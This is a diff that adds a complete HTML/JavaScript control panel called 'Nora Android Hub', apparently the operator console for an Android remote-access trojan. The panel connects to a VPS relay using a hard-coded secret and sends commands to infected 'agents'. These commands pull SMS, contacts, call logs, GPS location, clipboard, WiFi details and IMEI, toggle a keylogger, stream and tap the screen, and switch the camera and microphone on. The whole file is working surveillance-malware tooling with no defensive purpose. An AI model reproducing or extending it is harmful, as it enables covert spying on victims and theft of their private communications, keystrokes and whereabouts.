@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Nora Android Hub</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0f1117;--surface:#1a1d27;--surface2:#22263a;--border:#2e3350;
+  --text:#e2e8f0;--text2:#94a3b8;--accent:#6366f1;--green:#22c55e;
+  --red:#ef4444;--yellow:#f59e0b;--shadow:0 4px 24px rgba(0,0,0,.4);
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+
+/* TOPBAR */
+#topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:0 16px;height:52px;display:flex;align-items:center;gap:12px;flex-shrink:0}
+.logo{font-size:1.1rem;font-weight:800;letter-spacing:-.5px;color:var(--text)}
+.logo sub{font-size:.6rem;color:var(--accent);vertical-align:super;font-weight:400}
+#conn-pill{display:flex;align-items:center;gap:5px;font-size:.72rem;padding:3px 10px;border-radius:99px;background:var(--surface2);border:1px solid var(--border)}
+#conn-dot{width:7px;height:7px;border-radius:50%;background:var(--red)}
+#conn-dot.ok{background:var(--green)}
+select{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:5px 10px;font-size:.78rem;cursor:pointer;outline:none}
+#relay-url-row{margin-left:auto;display:flex;gap:6px;align-items:center}
+#relay-url{width:200px;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:4px 9px;font-size:.75rem;outline:none}
+.tb-btn{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:5px 12px;font-size:.76rem;cursor:pointer}
+.tb-btn:hover{border-color:var(--accent)}
+
+/* LAYOUT */
+#shell{display:flex;flex:1;overflow:hidden}
+
+/* SIDEBAR */
+#sidebar{width:180px;flex-shrink:0;background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;padding:8px 0}
+.nav-lbl{font-size:.64rem;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.08em;padding:10px 14px 4px}
+.nav-btn{display:flex;align-items:center;gap:9px;width:100%;padding:8px 14px;background:none;border:none;color:var(--text2);font-size:.8rem;cursor:pointer;text-align:left;border-radius:0;transition:background .12s,color .12s}
+.nav-btn:hover{background:var(--surface2);color:var(--text)}
+.nav-btn.active{background:rgba(99,102,241,.15);color:var(--accent);font-weight:600}
+.nav-btn .ico{font-size:1rem;width:20px;text-align:center}
+
+/* PANELS */
+#main{flex:1;overflow:hidden;display:flex;flex-direction:column}
+.panel{display:none;flex-direction:column;flex:1;overflow:hidden;padding:16px;gap:12px}
+.panel.on{display:flex}
+.ph{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.ph h2{font-size:.95rem;font-weight:700}
+.ph .meta{font-size:.72rem;color:var(--text2);margin-left:auto}
+.act-btn{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:5px 13px;font-size:.76rem;cursor:pointer}
+.act-btn:hover{border-color:var(--accent)}
+.act-btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.act-btn.danger{background:rgba(239,68,68,.15);border-color:var(--red);color:var(--red)}
+.ipt{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:6px 10px;font-size:.8rem;outline:none;width:100%}
+.ipt:focus{border-color:var(--accent)}
+
+/* DATA ROWS */
+.data-list{flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:4px}
+.row{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-size:.78rem}
+.row .r-title{font-weight:600;color:var(--text);margin-bottom:2px}
+.row .r-sub{color:var(--text2);font-size:.72rem}
+.row .r-body{color:var(--text);margin-top:4px;word-break:break-word}
+.empty{color:var(--text2);font-size:.8rem;padding:20px;text-align:center}
+
+/* NOTIFICATIONS */
+.nf-item{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-size:.78rem;display:flex;flex-direction:column;gap:3px}
+.nf-app{font-weight:700;color:var(--accent);font-size:.7rem;text-transform:uppercase}
+.nf-title{font-weight:600}
+.nf-body{color:var(--text2)}
+.nf-time{color:var(--text2);font-size:.68rem;margin-top:2px}
+
+/* KEYLOG */
+#kl-box{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px;font-family:monospace;font-size:.82rem;flex:1;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+
+/* SCREENSHOT */
+#ss-img{max-width:100%;border-radius:10px;border:1px solid var(--border);display:none}
+
+/* SCREEN STREAM */
+#scr-wrap{flex:1;display:flex;align-items:center;justify-content:center;background:#000;border-radius:10px;overflow:hidden;position:relative}
+#scr-canvas{max-width:100%;max-height:100%;cursor:crosshair}
+#scr-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--text2);font-size:.82rem}
+
+/* LOCATION */
+#loc-map-link{color:var(--accent);font-size:.8rem;text-decoration:none}
+#loc-map-link:hover{text-decoration:underline}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:12px}
+.stat-label{font-size:.68rem;color:var(--text2);text-transform:uppercase;letter-spacing:.06em}
+.stat-val{font-size:1.1rem;font-weight:700;margin-top:4px}
+
+/* TOASTS */
+#toasts{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column;gap:8px;z-index:9999}
+.toast{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:.78rem;color:var(--text);box-shadow:var(--shadow);max-width:300px;animation:slideIn .2s ease}
+.toast.ok{border-color:var(--green)}
+.toast.err{border-color:var(--red)}
+.toast.info{border-color:var(--accent);opacity:.9}
+@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <div class="logo">Nora<sub>ANDROID</sub></div>
+  <div id="conn-pill"><div id="conn-dot"></div><span id="conn-txt">Disconnected</span></div>
+  <select id="agent-sel"><option value="">Select agent</option></select>
+  <div id="relay-url-row">
+    <input id="relay-url" type="text" placeholder="http://VPS_IP:5000" value="">
+    <button class="tb-btn" id="connect-btn">Connect</button>
+  </div>
+</div>
+
+<div id="shell">
+<nav id="sidebar">
+  <div class="nav-lbl">📡 Live</div>
+  <button class="nav-btn active" data-p="notifications"><span class="ico">🔔</span><span>Notifications</span></button>
+  <button class="nav-btn" data-p="screen"><span class="ico">📺</span><span>Screen</span></button>
+  <button class="nav-btn" data-p="screenshot"><span class="ico">📸</span><span>Screenshot</span></button>
+  <button class="nav-btn" data-p="keylogger"><span class="ico">⌨️</span><span>Keylogger</span></button>
+
+  <div class="nav-lbl">📂 Data</div>
+  <button class="nav-btn" data-p="sms"><span class="ico">💬</span><span>SMS</span></button>
+  <button class="nav-btn" data-p="contacts"><span class="ico">👥</span><span>Contacts</span></button>
+  <button class="nav-btn" data-p="calls"><span class="ico">📞</span><span>Call Logs</span></button>
+  <button class="nav-btn" data-p="location"><span class="ico">📍</span><span>Location</span></button>
+  <button class="nav-btn" data-p="wifi"><span class="ico">📶</span><span>WiFi Info</span></button>
+  <button class="nav-btn" data-p="clipboard"><span class="ico">📋</span><span>Clipboard</span></button>
+  <button class="nav-btn" data-p="apps"><span class="ico">📦</span><span>Apps</span></button>
+
+  <div class="nav-lbl">⚙️ System</div>
+  <button class="nav-btn" data-p="sysinfo"><span class="ico">📊</span><span>System Info</span></button>
+  <button class="nav-btn" data-p="processes"><span class="ico">🔄</span><span>Processes</span></button>
+  <button class="nav-btn" data-p="device"><span class="ico">📱</span><span>Device</span></button>
+</nav>
+
+<div id="main">
+
+<!-- NOTIFICATIONS -->
+<div class="panel on" id="p-notifications">
+  <div class="ph"><h2>🔔 Notifications</h2><span class="meta" id="notif-count">0 received</span>
+    <button class="act-btn danger" id="notif-clear">Clear</button>
+  </div>
+  <div class="data-list" id="notif-feed"></div>
+</div>
+
+<!-- SCREEN -->
+<div class="panel" id="p-screen">
+  <div class="ph"><h2>📺 Live Screen</h2>
+    <button class="act-btn primary" id="scr-start">Start</button>
+    <button class="act-btn danger" id="scr-stop">Stop</button>
+    <span class="meta" id="scr-status">Idle</span>
+  </div>
+  <div id="scr-wrap">
+    <canvas id="scr-canvas"></canvas>
+    <div id="scr-overlay">Press Start to begin screen capture</div>
+  </div>
+</div>
+
+<!-- SCREENSHOT -->
+<div class="panel" id="p-screenshot">
+  <div class="ph"><h2>📸 Screenshot</h2>
+    <button class="act-btn primary" id="ss-btn">Take Screenshot</button>
+    <span class="meta" id="ss-status"></span>
+  </div>
+  <img id="ss-img" alt="screenshot">
+  <div class="empty" id="ss-empty">Press "Take Screenshot" to capture the screen</div>
+</div>
+
+<!-- KEYLOGGER -->
+<div class="panel" id="p-keylogger">
+  <div class="ph"><h2>⌨️ Keylogger</h2>
+    <button class="act-btn primary" id="kl-on">Enable</button>
+    <button class="act-btn danger" id="kl-off">Disable</button>
+    <button class="act-btn" id="kl-clear">Clear</button>
+    <span class="meta" id="kl-status">Unknown</span>
+  </div>
+  <div id="kl-box">Waiting for keystrokes...</div>
+</div>
+
+<!-- SMS -->
+<div class="panel" id="p-sms">
+  <div class="ph"><h2>💬 SMS Messages</h2><span class="meta" id="sms-count"></span>
+    <button class="act-btn primary" id="sms-fetch">Fetch SMS</button>
+    <button class="act-btn" id="sms-clear">Clear</button>
+  </div>
+  <input class="ipt" id="sms-q" placeholder="Filter by number or message..." style="flex-shrink:0">
+  <div class="data-list" id="sms-list"><div class="empty">Press Fetch SMS to load messages</div></div>
+</div>
+
+<!-- CONTACTS -->
+<div class="panel" id="p-contacts">
+  <div class="ph"><h2>👥 Contacts</h2><span class="meta" id="contacts-count"></span>
+    <button class="act-btn primary" id="contacts-fetch">Fetch Contacts</button>
+    <button class="act-btn" id="contacts-clear">Clear</button>
+  </div>
+  <input class="ipt" id="contacts-q" placeholder="Filter by name or number...">
+  <div class="data-list" id="contacts-list"><div class="empty">Press Fetch Contacts to load</div></div>
+</div>
+
+<!-- CALL LOGS -->
+<div class="panel" id="p-calls">
+  <div class="ph"><h2>📞 Call Logs</h2><span class="meta" id="calls-count"></span>
+    <button class="act-btn primary" id="calls-fetch">Fetch Call Logs</button>
+    <button class="act-btn" id="calls-clear">Clear</button>
+  </div>
+  <div class="data-list" id="calls-list"><div class="empty">Press Fetch Call Logs to load</div></div>
+</div>
+
+<!-- LOCATION -->
+<div class="panel" id="p-location">
+  <div class="ph"><h2>📍 Location</h2>
+    <button class="act-btn primary" id="loc-fetch">Get Location</button>
+  </div>
+  <div class="stat-grid" id="loc-grid">
+    <div class="stat-card"><div class="stat-label">Latitude</div><div class="stat-val" id="loc-lat">--</div></div>
+    <div class="stat-card"><div class="stat-label">Longitude</div><div class="stat-val" id="loc-lng">--</div></div>
+    <div class="stat-card"><div class="stat-label">Accuracy</div><div class="stat-val" id="loc-acc">--</div></div>
+    <div class="stat-card"><div class="stat-label">Provider</div><div class="stat-val" id="loc-prov">--</div></div>
+  </div>
+  <a id="loc-map-link" href="#" target="_blank" style="display:none">📍 Open in Google Maps</a>
+</div>
+
+<!-- WIFI -->
+<div class="panel" id="p-wifi">
+  <div class="ph"><h2>📶 WiFi Info</h2>
+    <button class="act-btn primary" id="wifi-fetch">Fetch WiFi</button>
+  </div>
+  <div class="stat-grid" id="wifi-grid">
+    <div class="stat-card"><div class="stat-label">SSID</div><div class="stat-val" id="wifi-ssid">--</div></div>
+    <div class="stat-card"><div class="stat-label">BSSID</div><div class="stat-val" id="wifi-bssid" style="font-size:.8rem">--</div></div>
+    <div class="stat-card"><div class="stat-label">IP Address</div><div class="stat-val" id="wifi-ip" style="font-size:.85rem">--</div></div>
+    <div class="stat-card"><div class="stat-label">Signal (RSSI)</div><div class="stat-val" id="wifi-rssi">--</div></div>
+    <div class="stat-card"><div class="stat-label">Link Speed</div><div class="stat-val" id="wifi-speed">--</div></div>
+    <div class="stat-card"><div class="stat-label">Frequency</div><div class="stat-val" id="wifi-freq">--</div></div>
+  </div>
+</div>
+
+<!-- CLIPBOARD -->
+<div class="panel" id="p-clipboard">
+  <div class="ph"><h2>📋 Clipboard</h2>
+    <button class="act-btn primary" id="clip-fetch">Fetch Clipboard</button>
+  </div>
+  <div class="row" id="clip-content" style="flex:1;font-size:.85rem;white-space:pre-wrap;word-break:break-all">Press Fetch Clipboard to read</div>
+</div>
+
+<!-- APPS -->
+<div class="panel" id="p-apps">
+  <div class="ph"><h2>📦 Installed Apps</h2><span class="meta" id="apps-count"></span>
+    <button class="act-btn primary" id="apps-fetch">Fetch Apps</button>
+    <button class="act-btn" id="apps-clear">Clear</button>
+  </div>
+  <input class="ipt" id="apps-q" placeholder="Filter by app name or package...">
+  <div class="data-list" id="apps-list"><div class="empty">Press Fetch Apps to load</div></div>
+</div>
+
+<!-- SYSINFO -->
+<div class="panel" id="p-sysinfo">
+  <div class="ph"><h2>📊 System Info</h2>
+    <button class="act-btn primary" id="si-fetch">Refresh</button>
+  </div>
+  <div class="stat-grid" id="si-grid"></div>
+</div>
+
+<!-- PROCESSES -->
+<div class="panel" id="p-processes">
+  <div class="ph"><h2>🔄 Running Processes</h2><span class="meta" id="proc-count"></span>
+    <button class="act-btn primary" id="proc-fetch">Fetch Processes</button>
+  </div>
+  <input class="ipt" id="proc-q" placeholder="Filter by process name...">
+  <div class="data-list" id="proc-list"><div class="empty">Press Fetch Processes to load</div></div>
+</div>
+
+<!-- DEVICE -->
+<div class="panel" id="p-device">
+  <div class="ph"><h2>📱 Device Control</h2></div>
+  <div style="display:flex;flex-wrap:wrap;gap:10px;padding:8px 0">
+    <button class="act-btn danger" id="lock-btn" style="padding:12px 24px;font-size:.85rem">🔒 Lock Screen</button>
+    <button class="act-btn primary" id="cam-on" style="padding:12px 24px;font-size:.85rem">📷 Camera On</button>
+    <button class="act-btn danger" id="cam-off" style="padding:12px 24px;font-size:.85rem">📷 Camera Off</button>
+    <button class="act-btn primary" id="mic-on" style="padding:12px 24px;font-size:.85rem">🎙️ Mic On</button>
+    <button class="act-btn danger" id="mic-off" style="padding:12px 24px;font-size:.85rem">🎙️ Mic Off</button>
+  </div>
+  <div class="row" id="device-status" style="font-size:.8rem;color:var(--text2)">Select an action above</div>
+</div>
+
+</div><!-- /main -->
+</div><!-- /shell -->
+
+<div id="toasts"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+'use strict';
+
+// ── Helpers ─────────────────────────────────────────────────────
+const $  = id => document.getElementById(id);
+const $$ = sel => Array.from(document.querySelectorAll(sel));
+function toast(msg, type) {
+  const el = document.createElement("div");
+  el.className = "toast" + (type ? " " + type : "");
+  el.textContent = msg;
+  $("toasts").prepend(el);
+  setTimeout(() => el.remove(), 4000);
+}
+
+// ── Relay URL persistence ────────────────────────────────────────
+const saved = localStorage.getItem("nora_relay_url") || "";
+if (saved) $("relay-url").value = saved;
+
+// ── Navigation ──────────────────────────────────────────────────
+$$(".nav-btn").forEach(btn => {
+  btn.addEventListener("click", () => {
+    $$(".nav-btn").forEach(b => b.classList.remove("active"));
+    $$(".panel").forEach(p => p.classList.remove("on"));
+    btn.classList.add("active");
+    const p = $("p-" + btn.dataset.p);
+    if (p) p.classList.add("on");
+  });
+});
+
+// ── Socket.IO state ──────────────────────────────────────────────
+let socket = null;
+let agent  = "";
+
+function setConn(state) {
+  const dot = $("conn-dot"), txt = $("conn-txt");
+  if (state === "ok") { dot.className = "ok"; txt.textContent = "Connected"; }
+  else if (state === "wait") { dot.className = ""; dot.style.background = "var(--yellow)"; txt.textContent = "Connecting…"; }
+  else { dot.className = ""; dot.style.background = "var(--red)"; txt.textContent = "Disconnected"; }
+}
+
+function connect(url) {
+  if (socket) { socket.disconnect(); socket = null; }
+  if (!url) { toast("Enter your VPS relay URL first", "err"); return; }
+  localStorage.setItem("nora_relay_url", url);
+  setConn("wait");
+
+  socket = io(url, { transports: ["websocket"], reconnection: true, reconnectionDelay: 2000 });
+
+  socket.on("connect", () => {
+    setConn("ok");
+    socket.emit("hub_auth", { secret: "nora2024" });
+    toast("Connected to relay", "ok");
+  });
+  socket.on("disconnect", () => { setConn("off"); toast("Disconnected", "err"); });
+  socket.on("connect_error", e => { setConn("off"); toast("Cannot connect: " + e.message, "err"); });
+
+  socket.on("agent_list", list => {
+    const sel = $("agent-sel");
+    const prev = sel.value;
+    sel.innerHTML = '<option value="">Select agent</option>';
+    list.filter(a => a.platform === "android" || !a.platform || true).forEach(a => {
+      const o = document.createElement("option");
+      o.value = o.textContent = a.name + (a.platform === "android" ? "" : " [win]");
+      sel.appendChild(o);
+    });
+    if (prev && list.find(a => a.name === prev)) sel.value = prev;
+    else if (list.length === 1) { sel.value = list[0].name; agent = list[0].name; }
+    if (sel.value) agent = sel.value;
+  });
+
+  // ── Android data results ──────────────────────────────────────
+  socket.on("sms_result", d => renderSms(d.sms || []));
+  socket.on("contacts_result", d => renderContacts(d.contacts || []));
+  socket.on("call_logs_result", d => renderCalls(d.call_logs || []));
+  socket.on("location_result", d => renderLocation(d));
+  socket.on("wifi_info_result", d => renderWifi(d));
+  socket.on("clipboard_content_result", d => { $("clip-content").textContent = d.text || "(empty)"; });
+  socket.on("installed_apps_result", d => renderApps(d.apps || []));
+  socket.on("sysinfo_result", d => renderSysinfo(d));
+  socket.on("processes_result", d => renderProcesses(d.processes || []));
+  socket.on("screen_off_result", () => { $("device-status").textContent = "Lock command sent ✓"; toast("Lock screen sent", "ok"); });
+  socket.on("keylog_result", d => { $("kl-status").textContent = d.enabled ? "● Enabled" : "○ Disabled"; });
+
+  // ── Screenshot ────────────────────────────────────────────────
+  socket.on("screenshot_result", d => {
+    if (!d || !d.data) { toast("Screenshot failed — check permissions", "err"); return; }
+    const img = $("ss-img");
+    img.src = "data:image/png;base64," + d.data;
+    img.style.display = "block";
+    $("ss-empty").style.display = "none";
+    $("ss-status").textContent = "Captured";
+    toast("Screenshot received", "ok");
+  });
+
+  // ── Live screen frames ────────────────────────────────────────
+  const cvs = $("scr-canvas"), ctx = cvs.getContext("2d");
+  socket.on("screen_frame", d => {
+    if (!d || !d.data) return;
+    $("scr-overlay").style.display = "none";
+    const img2 = new Image();
+    img2.onload = () => {
+      cvs.width = img2.width; cvs.height = img2.height;
+      ctx.drawImage(img2, 0, 0);
+    };
+    img2.src = "data:image/jpeg;base64," + d.data;
+  });
+
+  // ── Keylogger chars ───────────────────────────────────────────
+  socket.on("keylog_char", d => {
+    const box = $("kl-box");
+    if (box.textContent === "Waiting for keystrokes...") box.textContent = "";
+    box.textContent += d.char || "";
+    box.scrollTop = box.scrollHeight;
+  });
+
+  // ── Notifications ─────────────────────────────────────────────
+  socket.on("notification_event", d => {
+    const feed = $("notif-feed");
+    const item = document.createElement("div");
+    item.className = "nf-item";
+    item.innerHTML = `<div class="nf-app">${esc(d.app||"")}</div>
+      <div class="nf-title">${esc(d.title||"")}</div>
+      <div class="nf-body">${esc(d.text||"")}</div>
+      <div class="nf-time">${new Date().toLocaleTimeString()}</div>`;
+    feed.prepend(item);
+    const c = feed.children.length;
+    $("notif-count").textContent = c + " received";
+  });
+
+  // ── Tap on screen canvas ──────────────────────────────────────
+  cvs.addEventListener("mousedown", e => {
+    if (!agent) return;
+    e.preventDefault();
+    const rect = cvs.getBoundingClientRect();
+    const sx = (e.clientX - rect.left) / rect.width;
+    const sy = (e.clientY - rect.top)  / rect.height;
+    emit("inject_input", { type: "tap", x: sx * cvs.width, y: sy * cvs.height });
+  });
+}
+
+$("connect-btn").addEventListener("click", () => {
+  connect($("relay-url").value.trim());
+});
+$("relay-url").addEventListener("keydown", e => { if (e.key === "Enter") connect($("relay-url").value.trim()); });
+// Auto-connect if URL was saved
+if (saved) connect(saved);
+
+$("agent-sel").addEventListener("change", () => {
+  agent = $("agent-sel").value;
+  if (agent) toast("Agent: " + agent, "info");
+});
+
+// ── emit helper ──────────────────────────────────────────────────
+function emit(event, payload) {
+  if (!socket || !socket.connected) { toast("Not connected", "err"); return; }
+  if (!agent) { toast("No agent selected", "err"); return; }
+  toast("→ " + event, "info");
+  socket.emit(event, { ...(payload||{}), _target: agent, _requester: socket.id });
+  // Timeout warning
+  const resultEvent = {
+    "get_sms":"sms_result","get_contacts":"contacts_result",
+    "get_call_logs":"call_logs_result","get_location":"location_result",
+    "get_wifi_info":"wifi_info_result","get_clipboard_content":"clipboard_content_result",
+    "get_installed_apps":"installed_apps_result","get_sysinfo":"sysinfo_result",
+    "get_processes":"processes_result","take_screenshot":"screenshot_result",
+    "screen_off":"screen_off_result","keylog_on":"keylog_result","keylog_off":"keylog_result"
+  }[event];
+  if (resultEvent) {
+    const t = setTimeout(() => toast("No response for " + event + " — check app permissions or relay", "err"), 8000);
+    socket.once(resultEvent, () => clearTimeout(t));
+  }
+}
+
+// ── Button wiring ────────────────────────────────────────────────
+$("sms-fetch").onclick    = () => emit("get_sms", {});
+$("contacts-fetch").onclick = () => emit("get_contacts", {});
+$("calls-fetch").onclick  = () => emit("get_call_logs", {});
+$("loc-fetch").onclick    = () => emit("get_location", {});
+$("wifi-fetch").onclick   = () => emit("get_wifi_info", {});
+$("clip-fetch").onclick   = () => emit("get_clipboard_content", {});
+$("apps-fetch").onclick   = () => emit("get_installed_apps", {});
+$("si-fetch").onclick     = () => emit("get_sysinfo", {});
+$("proc-fetch").onclick   = () => emit("get_processes", {});
+$("ss-btn").onclick       = () => { $("ss-status").textContent = "Capturing…"; emit("take_screenshot", {}); };
+$("lock-btn").onclick     = () => { $("device-status").textContent = "Sending…"; emit("screen_off", {}); };
+$("kl-on").onclick        = () => emit("keylog_on", {});
+$("kl-off").onclick       = () => emit("keylog_off", {});
+$("kl-clear").onclick     = () => { $("kl-box").textContent = "Waiting for keystrokes..."; };
+$("cam-on").onclick       = () => { emit("camera_on", {}); $("device-status").textContent = "Camera on sent"; };
+$("cam-off").onclick      = () => { emit("camera_off", {}); $("device-status").textContent = "Camera off sent"; };
+$("mic-on").onclick       = () => { emit("mic_on", {}); $("device-status").textContent = "Mic on sent"; };
+$("mic-off").onclick      = () => { emit("mic_off", {}); $("device-status").textContent = "Mic off sent"; };
+$("scr-start").onclick    = () => { emit("start_screen", {}); $("scr-status").textContent = "Streaming…"; };
+$("scr-stop").onclick     = () => { emit("stop_screen", {}); $("scr-status").textContent = "Stopped"; $("scr-overlay").style.display = "flex"; };
+$("notif-clear").onclick  = () => { $("notif-feed").innerHTML = ""; $("notif-count").textContent = "0 received"; };
+$("sms-clear").onclick    = () => { $("sms-list").innerHTML = '<div class="empty">Cleared</div>'; $("sms-count").textContent = ""; };
+$("contacts-clear").onclick = () => { $("contacts-list").innerHTML = '<div class="empty">Cleared</div>'; $("contacts-count").textContent = ""; };
+$("calls-clear").onclick  = () => { $("calls-list").innerHTML = '<div class="empty">Cleared</div>'; $("calls-count").textContent = ""; };
+$("apps-clear").onclick   = () => { $("apps-list").innerHTML = '<div class="empty">Cleared</div>'; $("apps-count").textContent = ""; };
+
+// ── Filter helpers ───────────────────────────────────────────────
+function filterList(inputId, listId, matchFn) {
+  $(inputId).addEventListener("input", () => {
+    const q = $(inputId).value.toLowerCase();
+    Array.from($(listId).children).forEach(el => {
+      el.style.display = !q || matchFn(el, q) ? "" : "none";
+    });
+  });
+}
+filterList("sms-q", "sms-list", (el, q) => el.textContent.toLowerCase().includes(q));
+filterList("contacts-q", "contacts-list", (el, q) => el.textContent.toLowerCase().includes(q));
+filterList("apps-q", "apps-list", (el, q) => el.textContent.toLowerCase().includes(q));
+filterList("proc-q", "proc-list", (el, q) => el.textContent.toLowerCase().includes(q));
+
+// ── Render functions ─────────────────────────────────────────────
+function esc(s) { return String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+
+function renderSms(list) {
+  $("sms-count").textContent = list.length + " messages";
+  if (!list.length) { $("sms-list").innerHTML = '<div class="empty">No messages found</div>'; return; }
+  $("sms-list").innerHTML = list.map(m => `<div class="row">
+    <div class="r-title">${esc(m.address||m.number||"Unknown")} <span style="color:var(--text2);font-weight:400;font-size:.7rem">${m.type==="1"||m.type===1?"Inbox":"Sent"}</span></div>
+    <div class="r-sub">${m.date ? new Date(Number(m.date)).toLocaleString() : ""}</div>
+    <div class="r-body">${esc(m.body||m.text||"")}</div>
+  </div>`).join("");
+  toast(list.length + " SMS loaded", "ok");
+}
+
+function renderContacts(list) {
+  $("contacts-count").textContent = list.length + " contacts";
+  if (!list.length) { $("contacts-list").innerHTML = '<div class="empty">No contacts found</div>'; return; }
+  $("contacts-list").innerHTML = list.map(c => `<div class="row">
+    <div class="r-title">${esc(c.name||"Unknown")}</div>
+    <div class="r-sub">${esc(c.number||c.phone||"")}</div>
+  </div>`).join("");
+  toast(list.length + " contacts loaded", "ok");
+}
+
+function renderCalls(list) {
+  $("calls-count").textContent = list.length + " calls";
+  if (!list.length) { $("calls-list").innerHTML = '<div class="empty">No call logs found</div>'; return; }
+  const types = {1:"Incoming",2:"Outgoing",3:"Missed"};
+  $("calls-list").innerHTML = list.map(c => `<div class="row">
+    <div class="r-title">${esc(c.number||c.name||"Unknown")} <span style="color:var(--text2);font-weight:400;font-size:.7rem">${types[c.type]||c.type||""}</span></div>
+    <div class="r-sub">${c.date ? new Date(Number(c.date)).toLocaleString() : ""} · ${c.duration||0}s</div>
+  </div>`).join("");
+  toast(list.length + " calls loaded", "ok");
+}
+
+function renderLocation(d) {
+  const lat = d.latitude || d.lat || "--";
+  const lng = d.longitude || d.lng || "--";
+  $("loc-lat").textContent  = typeof lat === "number" ? lat.toFixed(6) : lat;
+  $("loc-lng").textContent  = typeof lng === "number" ? lng.toFixed(6) : lng;
+  $("loc-acc").textContent  = d.accuracy ? d.accuracy.toFixed(1) + "m" : "--";
+  $("loc-prov").textContent = d.provider || "--";
+  if (typeof lat === "number" && typeof lng === "number") {
+    const link = $("loc-map-link");
+    link.href = "https://maps.google.com/?q=" + lat + "," + lng;
+    link.style.display = "inline";
+  }
+  toast("Location received", "ok");
+}
+
+function renderWifi(d) {
+  $("wifi-ssid").textContent  = d.ssid || "--";
+  $("wifi-bssid").textContent = d.bssid || "--";
+  $("wifi-ip").textContent    = d.ip || d.ipAddress || "--";
+  $("wifi-rssi").textContent  = d.rssi != null ? d.rssi + " dBm" : "--";
+  $("wifi-speed").textContent = d.linkSpeed ? d.linkSpeed + " Mbps" : "--";
+  $("wifi-freq").textContent  = d.frequency ? d.frequency + " MHz" : "--";
+  toast("WiFi info received", "ok");
+}
+
+function renderApps(list) {
+  $("apps-count").textContent = list.length + " apps";
+  if (!list.length) { $("apps-list").innerHTML = '<div class="empty">No apps found</div>'; return; }
+  $("apps-list").innerHTML = list.map(a => `<div class="row">
+    <div class="r-title">${esc(a.name||a.appName||a.packageName||"Unknown")}</div>
+    <div class="r-sub">${esc(a.packageName||a.pkg||"")}</div>
+  </div>`).join("");
+  toast(list.length + " apps loaded", "ok");
+}
+
+function renderSysinfo(d) {
+  const fields = [
+    ["Device",d.device||d.model],["Android",d.android||d.version||d.os],
+    ["CPU",d.cpu],["RAM Total",d.ramTotal||d.totalRam],["RAM Free",d.ramFree||d.freeRam],
+    ["Storage Total",d.storageTot],["Storage Free",d.storageFree],
+    ["Battery",d.battery!=null?d.battery+"%":null],["IMEI",d.imei],["Phone",d.phone]
+  ];
+  $("si-grid").innerHTML = fields.filter(([,v])=>v!=null&&v!="").map(([l,v])=>`
+    <div class="stat-card"><div class="stat-label">${esc(l)}</div><div class="stat-val" style="font-size:.9rem">${esc(String(v))}</div></div>
+  `).join("");
+  toast("System info received", "ok");
+}
+
+function renderProcesses(list) {
+  $("proc-count").textContent = list.length + " processes";
+  if (!list.length) { $("proc-list").innerHTML = '<div class="empty">No processes found</div>'; return; }
+  $("proc-list").innerHTML = list.map(p => `<div class="row">
+    <div class="r-title">${esc(p.name||p.processName||"Unknown")}</div>
+    <div class="r-sub">PID: ${p.pid||"--"} · ${p.importance||""}</div>
+  </div>`).join("");
+  toast(list.length + " processes loaded", "ok");
+}
+</script>
+</body>
+</html>
